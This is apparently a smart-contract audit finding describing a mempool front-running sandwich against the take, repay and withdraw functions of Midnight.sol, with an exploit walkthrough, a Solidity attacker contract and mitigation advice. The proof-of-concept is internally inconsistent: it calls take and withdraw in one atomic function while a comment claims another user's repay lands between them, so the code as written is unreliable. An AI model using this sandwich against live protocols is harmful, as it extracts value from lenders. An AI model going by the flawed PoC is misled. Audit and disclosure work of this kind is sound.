### Title
Front-Running Repayment/Liquidation Events Enables Risk-Free Arbitrage via Discounted Credit Unit Sandwich - (File: src/Midnight.sol)

---

### Summary

The `withdraw` function redeems credit units at a strict 1:1 ratio against loan tokens from the shared `withdrawable` pool, with no fair-share enforcement. Because sell offers can exist at price < 1 (negative tick), an attacker who monitors the mempool can front-run any large `repay` or `liquidate` transaction: buy discounted credit units via `take`, let the repayment land, then immediately drain the newly-available `withdrawable` balance at par. The protocol's own developer comment at line 27–29 acknowledges this incentive but provides no on-chain mitigation.

---

### Finding Description

**Vulnerability class:** Timing / front-running (transaction-ordering dependence)

**Root cause — three cooperating design facts:**

1. **`withdraw` redeems 1:1 at par, first-come-first-served.** [1](#0-0) 
   `_position.credit -= units` and `_marketState.withdrawable -= units` are decremented together, then `units` loan tokens are transferred out. There is no proportional-share check; whoever calls first drains the pool.

2. **`repay` and `liquidate` atomically increase `withdrawable`.** [2](#0-1) [3](#0-2) 
   Both functions write `marketState[id].withdrawable += units/repaidUnits` in the same transaction, making the new balance visible to any subsequent call in the same block.

3. **`take` accepts sell offers at any price < 1 (negative tick) with no taker-side slippage guard.** [4](#0-3) 
   `buyerAssets = units * buyerPrice / WAD`. When `buyerPrice < WAD` (tick < 0), the taker pays fewer assets than the credit units they receive. No minimum-price parameter exists in `take`.

**The protocol itself flags the consequence:** [5](#0-4) 

**End-to-end exploit path:**

```
Step 1 – Attacker (Eve) watches the mempool.
         She sees Bob's pending repay(500 units) transaction.

Step 2 – Eve front-runs (higher gas price):
         take(sellOffer @ tick=-100, units=100)
         buyerPrice ≈ 0.9 WAD  →  Eve pays 90 loan tokens, receives 100 credit units.

Step 3 – Bob's repay executes:
         marketState[id].withdrawable += 500

Step 4 – Eve calls withdraw(100 units):
         withdrawable -= 100  →  Eve receives 100 loan tokens.

Net: Eve spent 90, received 100 → profit 10 loan tokens (minus gas).
     Bob's repayment funded Eve's arbitrage; other lenders who held credit
     units at a discount are now unable to withdraw until further repayments.
```

---

### Impact Explanation

- **Direct, risk-free value extraction.** Eve's profit equals `(1 − offerPrice) × units` per attack, bounded only by the size of available discounted sell offers and the size of the pending repayment.
- **Lender harm.** The maker who posted the sell offer at price < 1 receives fewer assets than they would have obtained by simply waiting for the repayment and withdrawing at par. The attacker captures the entire discount that was intended as compensation for illiquidity risk.
- **Withdrawable pool depletion.** Other lenders who legitimately hold credit units and attempt to withdraw after the repayment may find `withdrawable` already drained, forcing them to wait for the next repayment event.

---

### Likelihood Explanation

- **No privileged access required.** Any Ethereum address with enough capital to take a sell offer can execute this.
- **Mempool visibility is standard.** Public mempools on Ethereum mainnet and most L2s expose pending transactions before inclusion. MEV bots routinely perform exactly this class of front-run.
- **Preconditions are realistic.** Discounted sell offers (price < 1) are an expected and documented market condition in a fixed-maturity lending protocol where lenders seek early liquidity. Large repayments are routine protocol events.
- **Profitability threshold is low.** Even a 1% discount on a 10,000-unit position yields 100 loan tokens of profit per attack, easily covering gas on any EVM chain.

---

### Recommendation

**Short term:**
- Add a `minSellerAssets` (or `minBuyerAssets`) slippage parameter to `take` so takers can atomically revert if the effective price deviates from their expectation. This does not prevent the attack but forces the attacker to commit to a price before seeing the repayment land.
- Expose the documented race-condition warning (currently only in developer NatSpec at line 27–29) in user-facing documentation and SDK warnings, particularly for makers posting sell offers at price < 1.

**Long term:**
- Consider a time-weighted or pro-rata withdrawal queue so that newly-repaid assets are distributed proportionally among credit holders rather than on a first-come-first-served basis. This eliminates the structural advantage of front-running.
- Alternatively, consider requiring a minimum holding period between acquiring credit units via `take` and calling `withdraw`, breaking the atomic buy-then-withdraw sandwich.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

// Assumptions:
//   - Market exists with loanToken = USDC
//   - totalUnits = 1000, withdrawable = 0
//   - A maker (Alice) has posted a sell offer:
//       offer.buy = false, offer.tick = -100 (price ≈ 0.9 WAD), maxUnits = 100
//   - Bob has a pending repay(500) transaction in the mempool

contract EveAttacker {
    IMidnight midnight;
    IERC20 usdc;

    function attack(
        Offer memory aliceOffer,
        bytes memory ratifierData,
        Market memory market
    ) external {
        // Step 1: Front-run Bob's repay — take Alice's discounted sell offer
        // Eve pays ~90 USDC, receives 100 credit units
        usdc.approve(address(midnight), 100e6);
        midnight.take(
            aliceOffer,
            ratifierData,
            100,          // units
            address(this),
            address(this),
            address(0),
            ""
        );

        // Step 2: Bob's repay(500) lands in the same block after Eve's take
        // marketState[id].withdrawable is now 500

        // Step 3: Eve immediately withdraws her 100 credit units at par
        midnight.withdraw(market, 100, address(this), address(this));
        // Eve receives 100 USDC having paid ~90 USDC → ~10 USDC profit
    }
}
```

**Expected outcome:** Eve's `usdc.balanceOf` increases by approximately `(1 − tickToPrice(offer.tick)) × 100` loan tokens. The `withdrawable` pool is reduced by 100, leaving other lenders unable to withdraw that portion until the next repayment event.
